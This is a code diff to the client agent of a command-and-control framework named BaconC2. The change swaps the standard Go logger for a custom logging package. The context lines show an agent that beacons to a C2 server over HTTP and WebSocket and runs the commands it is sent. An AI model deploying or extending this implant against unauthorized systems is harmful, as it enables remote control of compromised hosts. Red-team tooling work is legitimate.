@@ -5,7 +5,6 @@ import (
 	"encoding/hex"
 	"flag"
 	"fmt"
-	"log"
 	"net"
 	"os"
 	"os/signal"
@@ -18,6 +17,7 @@ import (
 	"github.com/RabbITCybErSeC/BaconC2/client/core/executor"
 	"github.com/RabbITCybErSeC/BaconC2/client/core/transport"
 	command_handler "github.com/RabbITCybErSeC/BaconC2/pkg/commands/handlers"
+	"github.com/RabbITCybErSeC/BaconC2/pkg/logging"
 	"github.com/RabbITCybErSeC/BaconC2/pkg/models"
 	"github.com/RabbITCybErSeC/BaconC2/pkg/queue"
 	"github.com/RabbITCybErSeC/BaconC2/pkg/utils/encoders"
@@ -33,6 +33,7 @@ var (
 )
 
 func main() {
+	logging.SetLevel(logging.LevelDebug)
 
 	serverURL := flag.String("server", defaultServerURL, "C2 server URL (e.g. http://127.0.0.1:8081)")
 	beaconInt := flag.Int("interval", int(defaultBeaconInterval.Seconds()), "Beacon interval in seconds")
@@ -56,40 +57,37 @@ func main() {
 	encoderChain := encoders.NewChainEncoder([]encoders.Encoder{encoders.DummyEncoder{}})
 
 	transportProtocol := transport.NewHTTPClientTransport(cfg.ServerURL, cfg.AgentID, cmdQueue, resultQueue, encoderChain)
-
 	wsTransport := transport.NewWebSocketTransport(cfg.ServerURL, cfg.AgentID)
 
 	commandRegistry := command_handler.GetGlobalCommandRegistry()
-
 	commandRegistry.RegisterHandler(command_handler.CommandHandler{
 		Name:    "return_results",
 		Handler: transportProtocol.SendResults,
 	})
 
 	commandExecutor := executor.NewDefaultCommandExecutor(cmdQueue, resultQueue, transportProtocol, wsTransport, cfg, commandRegistry)
-
 	client := agent.NewAgentClient(cfg, transportProtocol, commandExecutor, cmdQueue, resultQueue)
 
 	if err := client.Initialize(); err != nil {
-		log.Fatalf("Failed to initialize agent: %v", err)
+		logging.Error("Failed to initialize agent: %v", err)
+		os.Exit(1)
 	}
 
 	go commandExecutor.ProcessCommandQueue()
 
 	if err := client.Start(); err != nil {
-		log.Fatalf("Failed to start agent: %v", err)
+		logging.Error("Failed to start agent: %v", err)
+		os.Exit(1)
 	}
 
-	log.Println("Agent client started successfully")
+	logging.Info("Agent client started successfully")
 
-	// Handle termination signals
 	sigChan := make(chan os.Signal, 1)
-
 	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
 	<-sigChan
 
 	client.Stop()
-	log.Println("Agent client stopped")
+	logging.Info("Agent client stopped")
 }
 
 func generateAgentID() string {
